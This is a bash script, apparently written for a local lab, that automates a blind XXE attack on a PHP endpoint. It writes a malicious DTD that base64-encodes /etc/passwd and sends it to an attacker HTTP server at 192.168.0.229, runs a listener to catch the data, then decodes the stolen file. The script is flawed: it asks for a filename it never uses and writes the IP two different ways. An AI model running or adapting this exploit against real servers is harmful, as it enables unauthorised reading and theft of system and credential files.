#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.00.229/?file=%file;'>\">
%eval;
%exfil;
"""
echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$! 

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.0.229/malicious.dtd"> %myFile;]>
<root><name>carlos</name><tel>445464565</tel><email>carlitos@carlitos.com</email><password>carlos</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d 

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null